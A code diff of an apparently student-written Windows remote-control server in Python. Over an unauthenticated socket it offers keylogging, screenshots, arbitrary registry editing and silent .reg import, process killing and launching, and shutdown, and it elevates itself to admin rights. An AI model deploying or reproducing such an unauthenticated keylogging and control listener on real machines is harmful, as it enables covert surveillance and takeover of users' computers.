@@ -1,279 +1,426 @@
 import os
 import socket
-import threading
 import subprocess
-import time
-from tkinter import *
-from tkinter import messagebox
-from pynput import keyboard
-from pynput.keyboard import Key
+import threading
+from io import BytesIO
+from PIL import Image, ImageTk
+import pygetwindow as gw
+import ctypes
+import tkinter as tk
+from tkinter import filedialog
+from tkinter import ttk
+import winreg
+import keyboard
+import sys
+import mss
+import pygetwindow
+import pyautogui
+import psutil
+from serverDesigner import ServerApp
+from keylog import Keylogger
+import tkinter as tk
+import keyboard
+from shutdownDesigner import open_shutdown_app
+import tkinter as tk
 
-class Server:
-    def __init__(self):
-        self.window = Tk()
-        self.window.title("Server")
-        self.ip_label = Label(self.window, text="SERVER IP: ")
-        self.toggle_button = Button(self.window, text="Toggle Server", command=self.toggle_server)
-        self.ip_label.pack()
-        self.toggle_button.pack()
-        
-        self.server_open = False
-        self.server_socket = None
-        self.client_socket = None
-        self.buffer_size = 1024
-        self.data_path = "data"
-        self.log_path = "log.txt"
-        
-        self.keyboard_listener = None
-        self.keylogger_active = False
-        self.keylogger_hooked = False
+class Server(ServerApp):
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        self.recording = False
+        self.recorded_keys = []
+        self.keylogger = Keylogger()
 
-        self.init_ui()
-        
-    def init_ui(self):
-        self.update_ip_label()
-        self.window.mainloop()
-
-    def update_ip_label(self):
+    def receive_signal(self):
         try:
-            ip = socket.gethostbyname(socket.gethostname())
-            self.ip_label.config(text="SERVER IP: " + ip)
+            return self.nr.readline().strip()
         except Exception:
-            self.ip_label.config(text="SERVER IP: Not found!")
+            return "QUIT"
 
-    def toggle_server(self):
-        if not self.server_open:
-            self.start_server()
-        else:
-            self.stop_server()
+    def shutdown(self):
+        open_shutdown_app()
 
-    def start_server(self):
+    def base_registry_key(self, link):
+        a = None
+        if '\\' in link:
+            root_key = link.split('\\')[0].upper()
+            if root_key == "HKEY_CLASSES_ROOT":
+                a = winreg.HKEY_CLASSES_ROOT
+            elif root_key == "HKEY_CURRENT_USER":
+                a = winreg.HKEY_CURRENT_USER
+            elif root_key == "HKEY_LOCAL_MACHINE":
+                a = winreg.HKEY_LOCAL_MACHINE
+            elif root_key == "HKEY_USERS":
+                a = winreg.HKEY_USERS
+            elif root_key == "HKEY_CURRENT_CONFIG":
+                a = winreg.HKEY_CURRENT_CONFIG
+        return a
+
+    def get_value(self, a, link, value_name):
         try:
-            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.server_socket.bind(("0.0.0.0", 80))
-            self.server_socket.listen(1)
-            messagebox.showinfo("Information", "Server started successfully!")
-            self.server_open = True
-            self.client_socket, addr = self.server_socket.accept()
-            self.handle_client()
+            sub_key = winreg.OpenKey(a, link)
         except Exception as e:
-            messagebox.showwarning("Error", str(e))
-            if self.server_socket:
-                self.server_socket.close()
-            self.server_open = False
+            print("Error opening registry key:", e)
+            return "Error"
 
-    def stop_server(self):
+        print("Opened registry key:", link)
+
         try:
-            if self.keylogger_active:
-                self.toggle_keylogger()
-            if self.server_socket:
-                self.server_socket.close()
-            if self.client_socket:
-                self.client_socket.close()
-            messagebox.showinfo("Information", "Server stopped.")
-            self.server_open = False
+            op = winreg.QueryValueEx(sub_key, value_name)
+            value = op[0]
+            value_type = op[1]
+            print("Got value:", value_name)
+            print("Value:", value)
+            print("Value type:", value_type)
+            winreg.CloseKey(sub_key)
+            return value
         except Exception as e:
-            messagebox.showwarning("Error", str(e))
-            self.server_open = False
+            print("Error getting registry value:", e)
+            winreg.CloseKey(sub_key)
+            return "Error"
 
-    def send_message(self, message):
+    def set_value(self, a ,link, value_name, value, type_value):
         try:
-            self.client_socket.sendall(message.encode())
-        except Exception:
+            key = winreg.OpenKey(a, link, 0, winreg.KEY_SET_VALUE)
+            value_type = ""
+            if type_value == "String":
+                value_type = winreg.REG_SZ
+            elif type_value == "Multi-String":
+                value_type = winreg.REG_MULTI_SZ
+            elif type_value == "Expandable String":
+                value_type = winreg.REG_EXPAND_SZ
+            elif type_value == "DWORD":
+                value_type = winreg.REG_DWORD
+                value = int(value)
+            elif type_value == "QWORD":
+                value_type = winreg.REG_QWORD
+                value = int(value)
+            elif type_value == "Binary":
+                value_type = winreg.REG_BINARY
+                value = bytes(map(int, value.split()))
+            else:
+                return "Error: Invalid type"
+            winreg.SetValueEx(key, value_name, 0, value_type, value)
+            winreg.CloseKey(key)
+            return "Value set"
+        except Exception as e:
+            return f"Error: {e}"
+
+    def delete_value(self, a, link, value_name):
+        try:
+            key = winreg.OpenKey(a, link, 0, winreg.KEY_SET_VALUE)
+            winreg.DeleteValue(key, value_name)
+            winreg.CloseKey(key)
+
+            return("Value deleted")
+        except Exception as e:
+            return(f"Error: {e}")
+
+    def delete_key(self, a, link):
+        try:
+            winreg.DeleteKey(a, link)
+            return "Delete key successfully"
+        except Exception as e:
+            return f"Error: {e}"
+
+    def create_key(self, a, link):
+        try:
+            key = winreg.CreateKey(a, link)
+            winreg.CloseKey(key)
+
+            return("Successful key generation")
+        except Exception as e:
+            return(f"Error: {e}")
+
+    def registry(self):
+        s = ""
+        with open("fileReg.reg", "w") as fs:
             pass
+            
+        while True:
+            s = self.receive_signal()
+            if s == "REG":
+                    data = ""
+                    while True:
+                        line = self.nr.readline().strip()
+                        if not line:
+                            break
+                        data += line + "\n"
+                    with open("fileReg.reg", "w") as fin:
+                        fin.write(data)
+                    s = os.path.join(os.path.dirname(__file__), "fileReg.reg")
+                    try:
+                        subprocess.run(["regedit.exe", "/s", s], timeout=20)
+                        self.nw.write("Successful fix\n")
+                    except Exception as ex:
+                        print("Error:", ex)
+                        self.nw.write("Fix failure\n")
+                    self.nw.flush()
+            elif s == "SEND":
+                option = self.nr.readline().strip()
+                link = self.nr.readline().strip()
+                if(option != "Create key" or option != "Delete key"):
+                    value_name = self.nr.readline().strip()
+                if(option == "Set value"):
+                    value = self.nr.readline().strip()
+                    type_value = self.nr.readline().strip()
+                a = self.base_registry_key(link)
+                link2 = link[link.index('\\') + 1:]
+                if a is None:
+                    s = "Error"
+                else:
+                    if option == "Create key":
+                        s = self.create_key(a, link2)
+                    elif option == "Delete key":
+                        s = self.delete_key(a, link2)
+                    elif option == "Get value":
+                        s = self.get_value(a, link2, value_name)
+                    elif option == "Set value":
+                        s = self.set_value(a, link2, value_name, value, type_value)
+                    elif option == "Delete value":
+                        s = self.delete_value(a, link2, value_name)
+                    else:
+                        s = "Loi"
+                self.nw.write(s + "\n")
+                self.nw.flush()
+            elif s == "QUIT":
+                return
 
-    def recv_message(self):
+    def take_pic(self):
+        ss = ""
+        
+        while True:
+            ss = self.receive_signal()
+            if ss == "TAKE":
+                with mss.mss() as sct:
+                    screenshot = sct.shot()
+                    with open(screenshot, "rb") as image_file:
+                        image_data = image_file.read()
+                        print(image_data)
+                        s = str(len(image_data))
+                        self.nw.write(s + "\n")
+                        self.nw.flush()
+                        self.client.sendall(image_data)
+            elif ss == "QUIT":
+                return
+
+    def hookKey(self):
+        self.keylogger.hook()
+
+    def unhook(self):
+        self.keylogger.unhook()
+
+    def printkeys(self):
+        s = self.keylogger.print()
+        self.nw.write(s.replace("\n", "\r") + "\n")
+        self.nw.flush()
+
+    def key_log(self):
+        s = ""
+        while True:
+            s = self.receive_signal()
+            if s == "PRINT":
+                self.printkeys()
+            elif s == "HOOK":
+                self.hookKey()
+            elif s == "UNHOOK":
+                self.unhook()
+            elif s == "QUIT":
+                return
+
+    def get_process_info_from_pid(self, pid):
         try:
-            data = b""
-            while True:
-                chunk = self.client_socket.recv(self.buffer_size)
-                if not chunk:
-                    break
-                data += chunk
-                if b"End message" in data:
-                    break
-            return data.decode()
-        except Exception:
-            return ""
+            process = psutil.Process(pid)
+            return {
+                "name": process.name().split(".exe")[0],
+                "pid": process.pid,
+                "num_threads": process.num_threads()
+            }
+        except psutil.NoSuchProcess:
+            return None
 
-    def send_file(self, filename):
-        try:
-            with open(filename, "rb") as file:
-                while True:
-                    chunk = file.read(self.buffer_size)
-                    if not chunk:
-                        break
-                    self.client_socket.sendall(chunk)
-        except Exception:
-            pass
+    def application(self):
+        ss = ""
+        while True:
+            ss = self.receive_signal()
+            if ss == "List":
+                running_apps = set()
+                u = ""
 
-    def handle_client(self):
-        while self.server_open:
-            message = self.recv_message()
-            if message == "PROCESS":
-                process_list = self.get_process_list()
-                self.send_message(process_list)
-                while True:
-                    action = self.recv_message()
-                    value = self.recv_message()
-                    if action == "Exit":
-                        break
-                    elif action == "Kill":
-                        is_killed = self.kill_process(value)
-                        self.send_message(is_killed)
-                        process_list_updated = self.get_process_list()
-                        self.send_message(process_list_updated)
-                    elif action == "Start":
-                        is_started = self.start_application(value)
-                        self.send_message(is_started)
-                        process_list_updated = self.get_process_list()
-                        self.send_message(process_list_updated)
-            elif message == "APP":
-                application_list = self.get_application_list()
-                self.send_message(application_list)
-                while True:
-                    action = self.recv_message()
-                    value = self.recv_message()
-                    if action == "Exit":
-                        break
-                    elif action == "Kill":
-                        is_killed = self.kill_application(value)
-                        self.send_message(is_killed)
-                        application_list_updated = self.get_application_list()
-                        self.send_message(application_list_updated)
-                    elif action == "Start":
-                        is_started = self.start_application(value)
-                        self.send_message(is_started)
-                        application_list_updated = self.get_application_list()
-                        self.send_message(application_list_updated)
-            elif message == "KEYLOGGER":
-                self.toggle_keylogger()
-                while True:
-                    request = self.recv_message()
-                    if request == "HOOK":
-                        self.keylogger_hooked = False
-                        try:
-                            with open(self.log_path, "w") as log_file:
-                                log_file.write("")
-                        except Exception:
-                            pass
-                    elif request == "UNHOOK":
-                        self.keylogger_hooked = True
-                    elif request == "PRINT":
-                        if not self.keylogger_hooked:
-                            log_contents = self.read_log_file()
-                            self.send_message(log_contents)
-                            try:
-                                with open(self.log_path, "w") as log_file:
-                                    log_file.write("")
-                            except Exception:
-                                pass
-                        else:
-                            self.send_message("\0")
-                    elif request == "DELETE":
+                for window in gw.getWindowsWithTitle(''):
+                    if window.isMinimized or not window.visible:
+                        continue
+
+                    pid = ctypes.c_ulong(0)
+                    ctypes.windll.user32.GetWindowThreadProcessId(window._hWnd, ctypes.byref(pid))
+                    
+                    process_info = self.get_process_info_from_pid(pid.value)
+                    if process_info:
+                        running_apps.add((process_info["name"], process_info["pid"], process_info["num_threads"]))
+
+                u = str(len(running_apps))
+                self.nw.write(u + "\n")
+                self.nw.flush()
+
+                for app_info in running_apps:
+                    print(app_info)
+                    try:
+                        process_name = app_info[0]
+                        process_id = app_info[1]
+                        process_thread_count = app_info[2]
+                        u = process_name
+                        self.nw.write(u + "\n")
+                        self.nw.flush()
+                        u = str(process_id)
+                        self.nw.write(u + "\n")
+                        self.nw.flush()
+                        u = str(process_thread_count)
+                        self.nw.write(u + "\n")
+                        self.nw.flush()
+                    except Exception:
                         pass
-                    elif request == "EXIT":
+            elif ss == "KILL":
+                    ss = self.receive_signal()
+                    if ss == "QUIT":
                         break
-            elif message == "CAPTURE":
-                self.capture_screen()
-                self.send_file("captureScreen.png")
-            elif message == "SHUTDOWN":
-                self.turn_off()
-            elif message == "OUT":
-                self.client_socket.close()
-                self.server_socket.close()
-                self.server_open = False
-                self.keylogger_hooked = False
-                if self.keylogger_active:
-                    self.toggle_keylogger()
+                    elif ss == "KILLID":
+                        u = self.nr.readline().strip()
+                        test2 = False
+                        if u:
+                            try:
+                                process_id = int(u)
+                                os.kill(process_id, 9)
+                                self.nw.write("Process Killed\n")
+                            except Exception:
+                                self.nw.write("Error\n")
+                            self.nw.flush()
+            elif ss == "START":
+                    ss = self.receive_signal()
+                    if ss == "STARTID":
+                        u = self.nr.readline().strip()
+                        print(u)
+                        if u:
+                            try:
+                                u = u + ".exe"
+                                subprocess.Popen([u])
+                                self.nw.write("Process has been caught\n")
+                                self.nw.flush()
+                            except Exception as e:
+                                self.nw.write("Error: {}\n".format(str(e)))
+                                self.nw.flush()
+                    
+            elif ss == "QUIT":
                 break
 
-    def get_process_list(self):
-        try:
-            process_list = subprocess.check_output(["powershell.exe", "gps | select ProcessName,Id,Description"], shell=True)
-            return process_list.decode()
-        except Exception:
-            return ""
+    def process(self):
+        ss = ""
+        while True:
+            ss = self.receive_signal()
+            if ss == "List":
+                processes = []
+                for process in psutil.process_iter():
+                    processes.append(process)
+                u = str(len(processes))
+                self.nw.write(u + "\n")
+                self.nw.flush()
+                for p in processes:
+                    print(p)
+                    try:
+                        process_name = p.name()
+                        process_id = p.pid
+                        process_thread_count = p.num_threads()
+                        u = process_name
+                        self.nw.write(u + "\n")
+                        self.nw.flush()
+                        u = str(process_id)
+                        self.nw.write(u + "\n")
+                        self.nw.flush()
+                        u = str(process_thread_count)
+                        self.nw.write(u + "\n")
+                        self.nw.flush()
+                    except Exception:
+                        pass
 
-    def kill_process(self, pid):
-        try:
-            subprocess.run(["taskkill", "/F", "/PID", pid], check=True)
-            return "Success"
-        except Exception:
-            return "Fail"
+            elif ss == "KILL":
+                    ss = self.receive_signal()
+                    if ss == "QUIT":
+                        break
+                    elif ss == "KILLID":
+                        u = self.nr.readline().strip()
+                        test2 = False
+                        if u:
+                            try:
+                                process_id = int(u)
+                                os.kill(process_id, 9)
+                                self.nw.write("Process killed\n")
+                            except Exception:
+                                self.nw.write("Error\n")
+                            self.nw.flush()
+        
+            elif ss == "START":
+                    ss = self.receive_signal()
+                    if ss == "STARTID":
+                        u = self.nr.readline().strip()
+                        print(u)
+                        if u:
+                            try:
+                                u = u + ".exe"
+                                subprocess.Popen([u])
+                                self.nw.write("Process has been caught\n")
+                                self.nw.flush()
+                            except Exception as e:
+                                self.nw.write("Error: {}\n".format(str(e)))
+                                self.nw.flush()
 
-    def start_application(self, application_name):
-        try:
-            subprocess.run(["powershell.exe", "gps | Start-Process", application_name], check=True)
-            return "Success"
-        except Exception:
-            return "Fail"
+            elif ss == "QUIT":
+                break
 
-    def get_application_list(self):
-        try:
-            application_list = subprocess.check_output(["powershell.exe", "gps | where {$_.MainWindowTitle } | select ProcessName,Id,Description"], shell=True)
-            return application_list.decode()
-        except Exception:
-            return ""
+    def start_server(self):
+        ip = ("0.0.0.0", 5656)
+        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.server.bind(ip)
+        self.server.listen(100)
+        print(self.server)
+        print("Listening to client ...")
+        self.client, _ = self.server.accept()
+        self.ns = self.client.makefile('rw')
+        self.nr = self.ns
+        self.nw = self.ns
+        s = ""
+        while True:
+            s = self.receive_signal()
+            print(s)
+            if s == "KEYLOG":
+                self.key_log()
+            elif s == "SHUTDOWN":
+                self.shutdown()
+            elif s == "REGISTRY":
+                self.registry()
+            if s == "TAKEPIC":
+                self.take_pic()
+            elif s == "PROCESS":
+                self.process()
+            elif s == "APPLICATION":
+                self.application()
+            elif s == "QUIT":
+                break
+        
+        self.client.close()
+        self.server.close()
 
-    def kill_application(self, pid):
-        try:
-            subprocess.run(["taskkill", "/F", "/PID", pid], check=True)
-            return "Success"
-        except Exception:
-            return "Fail"
-
-    def toggle_keylogger(self):
-        if not self.keylogger_active:
-            self.keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
-            self.keyboard_listener.start()
-            self.keylogger_active = True
+def run_as_admin():
+    try:
+        if ctypes.windll.shell32.IsUserAnAdmin():
+            print("Already running with admin privileges.")
+            return True
         else:
-            if self.keyboard_listener:
-                self.keyboard_listener.stop()
-                self.keylogger_active = False
-
-    def on_key_press(self, key):
-        try:
-            key_text = self.get_key_text(key)
-            if key_text:
-                self.append_to_log(key_text)
-        except AttributeError:
-            pass
-
-    def get_key_text(self, key):
-        if isinstance(key, keyboard.KeyCode):
-            return key.char
-        elif key in Key.__members__.values():
-            return "[" + key.name + "]"
-        return ""
-
-    def append_to_log(self, text):
-        try:
-            with open(self.log_path, "a") as log_file:
-                log_file.write(text)
-        except Exception:
-            pass
-
-    def read_log_file(self):
-        try:
-            with open(self.log_path, "r") as log_file:
-                log_contents = log_file.read()
-            return log_contents
-        except Exception:
-            return ""
-
-    def capture_screen(self):
-        try:
-            os.system("screencapture -R0,0,1920,1080 captureScreen.png")
-        except Exception:
-            pass
-
-    def turn_off(self):
-        try:
-            os.system("shutdown -s -t 1")
-        except Exception:
-            pass
+            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 0)
+            return False
+    except Exception as e:
+        print("Error:", e)
+        return False
 
 if __name__ == "__main__":
-    Server()
+    if run_as_admin():
+        root = tk.Tk()
+        app = Server(root)
+        root.mainloop()
